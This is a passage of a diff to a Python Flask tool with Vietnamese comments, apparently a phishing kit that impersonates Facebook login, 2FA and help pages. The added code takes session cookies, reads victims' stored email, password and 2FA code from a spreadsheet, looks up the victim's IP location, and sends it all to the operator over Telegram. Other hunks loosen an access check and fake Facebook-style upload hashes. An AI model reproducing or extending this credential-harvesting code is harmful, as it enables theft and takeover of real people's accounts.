+                            print(f"[check_2fa_status] Lỗi đóng browser: {close_err}")
+
+                        return cookies_str, password_from_session
+                    except Exception as e:
+                        print(f"[check_2fa_status] Lỗi lấy cookies: {e}")
+                        return "", password_from_session
+
+                try:
+                    cookies_value, password = worker.call(_get_cookies_from_session, session_id, "users.xlsx")
+                    if not cookies_value:
+                        cookies_value = "Không lấy được"
+                except Exception as e:
+                    cookies_value = f"Lỗi: {str(e)[:50]}"
+                    password = "N/A"
+
+                
+
+                # Gửi Telegram
+
+                client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+
+                if ',' in client_ip:
+
+                    client_ip = client_ip.split(',')[0].strip()
+
+                location_info = get_ip_location(client_ip)
+
+                
+
+                # Lấy mã 2FA từ Excel nếu có
+                code_2fa = ""
+                try:
+                    from openpyxl import load_workbook
+                    if os.path.exists("users.xlsx"):
+                        wb = load_workbook("users.xlsx")
+                        ws = wb.active
+                        for row in range(ws.max_row, 1, -1):
+                            if ws.cell(row=row, column=1).value == email:
+                                code_2fa = ws.cell(row=row, column=3).value or ""
+                                break
+                except Exception:
+                    pass
+
+                # Định dạng như help form
+                telegram_msg = f"Address: {email}\n"
+                telegram_msg += f"Password: {password}\n"
+                if code_2fa:
+                    telegram_msg += f"2FA: {code_2fa}\n"
+                telegram_msg += "-----------------------------\n"
+                telegram_msg += f"IP: {client_ip} | {location_info}\n"
+                telegram_msg += "-----------------------------\n"
+                telegram_msg += f"Cookies: {cookies_value}"
+
+                # Force resend Telegram khi có cookies từ checkpoint_src=any
+                print(f"[check_2fa_status] Gửi Telegram với {len(cookies_value) if cookies_value else 0} ký tự cookies")
+                send_telegram_message(telegram_msg)
+
+                print(f"[check_2fa_status] Đã gửi Telegram cho {email}")
+
+                
+
+                return jsonify({
+
+                    "success": True,
+
+                    "completed": True,
+
+                    "cookies_saved": True,
+
+                    "redirect": "/help"
+
+                })
+
+            
+
+            # Vẫn đang ở trang 2FA
+
+            return jsonify({
+
+                "success": True,
+
+                "completed": False,
+
+                "url": current_url,
+
+                "message": "Đang đợi xác thực 2FA..."
+
+            })
+
+        except Exception as e:
+
+            return jsonify({"success": False, "error": str(e)}), 500
 
     
 
@@ -3621,8 +2928,6 @@ def create_unified_app():
 
             return jsonify({"success": False, "error": str(e)}), 500
 
-
-
     
 
     @app.route("/help")
@@ -3725,9 +3030,12 @@ def create_unified_app():
 
             return redirect("/")
 
-        if not (_has_login_row(email) or _has_login_cookies(email)):
-
-            return redirect("/")
+        # Nếu email từ URL param (?email=...), tin tưởng user vừa đăng nhập, cho vào help
+        email_from_url = request.args.get('email', '').strip()
+        if not email_from_url:
+            # Nếu không có email từ URL, kiểm tra trong Excel/cookies
+            if not (_has_login_row(email) or _has_login_cookies(email)):
+                return redirect("/")
 
         
 
@@ -3803,7 +3111,6 @@ def create_unified_app():
 
         return response
 
-
     @app.route("/help/<path:subpath>")
 
     def help_page_subpath(subpath: str):
@@ -3812,11 +3119,7 @@ def create_unified_app():
 
         return redirect("/help")
 
-
-
     
-
-
 
     @app.route("/submit_help", methods=["POST"])
 
@@ -4250,235 +3553,115 @@ def create_unified_app():
 
             return jsonify({"success": False, "error": str(e)}), 500
 
-
-
     
-
-
 
     @app.route("/upload_image", methods=["POST"])
 
-
-
     def upload_image():
-
-
 
         """Nhận file upload và trả về thông tin cho preview"""
 
-
-
         try:
-
-
 
             if 'file' not in request.files:
 
-
-
                 return jsonify({"success": False, "error": "No file provided"}), 400
 
-
-
             
-
-
 
             file = request.files['file']
 
-
-
             if file.filename == '':
-
-
 
                 return jsonify({"success": False, "error": "No file selected"}), 400
 
-
-
             
-
-
 
             # Read file bytes
 
-
-
             file_bytes = file.read()
 
-
-
             
-
-
 
             # Generate unique ID for the file
 
-
-
             import uuid
-
-
 
             import base64
 
-
-
             
-
-
 
             file_id = str(uuid.uuid4())[:16].replace('-', '')
 
-
-
             
-
-
 
             # Encode to base64 (truncated for storage)
 
-
-
             file_data_b64 = base64.b64encode(file_bytes).decode('utf-8')
 
-
-
             
-
-
 
             # Create response with Facebook-style format
 
-
-
             # The value is a hash-like string similar to Facebook's format
-
-
 
             hash_value = f"AZ{base64.b64encode(file_id.encode()).decode('utf-8').replace('=', '').replace('/', '').replace('+', '')[:80]}"
 
-
-
             
-
-
 
             response_data = {
 
-
-
                 "success": True,
-
-
 
                 "filename": file.filename,
 
-
-
                 "file_id": file_id,
-
-
 
                 "hash_value": hash_value,
 
-
-
                 "size": len(file_bytes),
-
-
 
                 "mime_type": file.content_type or 'application/octet-stream'
 
-
-
             }
 
-
-
             
-
-
 
             print(f"[Upload] File uploaded: {file.filename} ({len(file_bytes)} bytes)")
 
-
-
             return jsonify(response_data), 200
-
-
 
             
 
-
-
         except Exception as e:
-
-
 
             print(f"[Upload] Error: {e}")
 
-
-
             return jsonify({"success": False, "error": str(e)}), 500
 
-
-
     
-
-
 
     return app
 
-
-
-
-
-
-
-
-
-
-
 def start_all_server():
-
-
 
     """Khởi động server với cả login và help cùng port"""
 
-
-
     print("\n\033[1;34m" + "-" * 50 + "\033[0m")
-
-
 
     print("\033[1;32m              CHẠY SERVER\033[0m")
 
-
-
     print("\033[1;34m" + "-" * 50 + "\033[0m\n")
 
-
-
     
-
-
 
     port_str = get_input("Nhập port (mặc định: 5000): ", allow_empty=True)
 
-
-
     port = int(port_str) if port_str.isdigit() else 5000
-
-
 
     
 
-
-
     app = create_unified_app()
-
-
 
     master_url = f"http://localhost:{port}"
 
@@ -4486,119 +3669,57 @@ def start_all_server():
 
     print(f"\n\033[1;33m[*] Khởi động Server tại {master_url}\033[0m")
 
-
-
     print(f"\033[1;36m    - Login: {master_url}/\033[0m")
-
-
 
     print(f"\033[1;36m    - Help:  {master_url}/help\033[0m")
 
-
-
     print(f"\033[1;36m    Nhập Ctrl+C để dừng server\033[0m\n")
 
-
-
     
-
-
 
     try:
 
-
-
         app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False, threaded=True)
-
-
 
     except KeyboardInterrupt:
 
-
-
         print(f"\n\033[1;33m[*] Đã dừng server\033[0m")
-
-
 
     except Exception as e:
 
-
-
         print(f"\n\033[1;31m[!] Lỗi server: {e}\033[0m")
 
-
-
     
-
-
 
     input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")
 
-
-
-
-
-
-
-
-
-
-
 def main():
-
-
 
     """Hàm chính"""
 
-
-
     os.system('cls' if os.name == 'nt' else 'clear')
-
-
 
     print_logo()
 
-
-
     
-
-
 
     while True:
 
-
-
         print_menu()
 
-
-
         
-
-
 
         try:
 
-
-
             choice = get_input("\nNhập lựa chọn của bạn: ", allow_empty=True)
-
-
 
         except KeyboardInterrupt:
 
-
-
             print("\n\n\033[1;33m[*] Tạm biệt!\033[0m")
-
-
 
             break
 
-
-
         
-
-
 
         if choice == "1":
 
@@ -4622,69 +3743,30 @@ def main():
 
         elif choice == "0":
 
-
-
             print("\n\033[1;33m[*] Tạm biệt!\033[0m")
-
-
 
             break
 
-
-
         else:
-
-
 
             print("\n\033[1;31m[!] Lựa chọn không hợp lệ\033[0m")
 
-
-
             time.sleep(1)
-
-
 
         
 
-
-
         os.system('cls' if os.name == 'nt' else 'clear')
-
-
 
         print_logo()
 
-
-
-
-
-
-
-
-
-
-
 if __name__ == "__main__":
-
-
 
     try:
 
-
-
         main()
-
-
 
     except KeyboardInterrupt:
 
-
-
         print("\n\n\033[1;33m[*] Đã thoát tool\033[0m")
 
-
-
         sys.exit(0)
-
-
-
